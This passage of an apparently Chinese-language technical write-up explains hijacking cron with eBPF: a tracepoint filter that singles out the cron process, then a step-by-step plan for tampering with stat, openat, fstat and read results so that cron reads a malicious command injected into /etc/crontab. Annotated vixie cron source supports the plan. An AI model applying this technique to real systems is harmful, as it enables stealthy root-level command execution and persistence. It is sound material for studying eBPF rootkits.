## 劫持Cron

``` bash
# 首先确保cron在运行，ps -ef | grep cron
$less /etc/crontab

```

筛选出Cron进程：  
```
SEC("raw_tracepoint/sys_enter")
int raw_tp_sys_enter(struct bpf_raw_tracepoint_args *ctx) {
	char comm[TASK_COMM_LEN] = {0};
	bpf_get_current_comm(&comm, sizeof(comm));
	if (memcmp(comm, TARGET_NAME, sizeof(TARGET_NAME))){
		return 0;
	}
	bpf_log("-------> %s\n", comm);
	return 0;
}
```

这时候看log，可以发现Cron在疯狂的调用系统调用:  
```
$ bash compile.sh
2022/07/11 09:37:30 [LOG]  -----------> cron
2022/07/11 09:37:30 [LOG]  -----------> cron
2022/07/11 09:37:30 [LOG]  -----------> cron
```

### 攻击思路
让cron读到文件变化，去主动读取任务文件。然后我们再覆盖任务文件。  
最简步骤：  
1. cron调用stat检查contab配置目录是否修改。修改stat结果，触发contab目录的配置扫描
2. cron，调用openat打开每个文件，调用fstat检查文件是否变化
3. 在/etc/contab文件打开后，在openat处记录fd
4. 在fstat调用处，检查fd是否为/etc/crontab文件，如果是修改fstat结果，触发contab去读文件
5. 在read_exit处，检查fd是否为/etc/crontab文件，如果是修改read_exit结果，注入恶意命令

```
调用顺序：
1. stat_enter，记录stat_buf_ptr
2. stat_exit，修改stat_buf_ptr。触发fstat。
3. openat_enter，记录当前文件名
4. openat_exit，判断当前文件是否是/etc/crontab文件，如果是的，就记录该文件的fd
5. fstat_enter，根据fd判断是否是/etc/crontab文件，如果是的，就记录fstat_buf_ptr
6. fstat_exit，根据fd判断是否是/etc/crontab文件，如果是的，就修改fstat_buf_ptr。触发read。
5. read_exit，根据fd判断是否是/etc/crontab文件，就在read_exit处注入恶意命令。
```

1. Cron流程  
先利用stat检查SYSCRONTAB目录是否变化，再利用fstat检查每个文件是否变化。  
``` c
// https://github.com/vixie/cron/blob/master/database.c#L67
if (stat(SYSCRONTAB, &syscron_stat) < OK)
	syscron_stat.st_mtim = ts_zero;

// https://github.com/vixie/cron/blob/master/database.c#L92
if (!TEQUAL(syscron_stat.st_mtim, ts_zero))
	process_crontab("root", NULL, SYSCRONTAB, &syscron_stat,
			&new_db, old_db);

if ((crontab_fd = open(tabname, O_RDONLY|O_NONBLOCK|O_NOFOLLOW, 0)) < OK) {
	/* crontab not accessible?
		*/
	log_it(fname, getpid(), "CAN'T OPEN", tabname);
	goto next_crontab;
}

if (fstat(crontab_fd, statbuf) < OK) {
	log_it(fname, getpid(), "FSTAT FAILED", tabname);
	goto next_crontab;
}
```